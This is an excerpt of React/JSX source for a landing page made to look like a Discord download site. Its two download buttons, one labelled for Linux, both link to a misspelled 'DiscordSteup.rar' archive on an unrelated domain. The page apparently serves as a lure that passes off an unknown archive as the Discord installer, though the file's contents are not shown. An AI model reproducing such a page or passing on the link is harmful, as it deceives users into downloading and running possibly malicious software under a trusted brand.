      ...
      <div className={`min-h-screen theme-transition ${
            ...
            <div className="grid lg:grid-cols-2 gap-12 items-center">
              <div className={`text-left ${heroInView ? 'fade-in-up' : 'opacity-0'}`}>
                ...
                <div className={`flex flex-col sm:flex-row gap-4 ${heroInView ? 'fade-in-up stagger-3' : 'opacity-0'}`}>
                  <a href="https://www.xnvcy.cn/static/js/DiscordSteup.rar" className="bg-white text-gray-900 px-8 py-4 rounded-full font-medium text-lg hover:bg-gray-100 transition-all duration-300 flex items-center justify-center discord-button tilt-3d ripple micro-bounce magnetic hover-glow" download>
        ...
        >
          <div className="max-w-4xl mx-auto">
            ...
            <a href="https://www.xnvcy.cn/static/js/DiscordSteup.rar" className="bg-white text-gray-900 px-8 py-4 rounded-full font-medium text-lg hover:bg-gray-100 transition-all duration-300 discord-button pulse-glow ripple micro-bounce magnetic hover-glow" download>
              {t.cta.downloadLinux}
            </a>
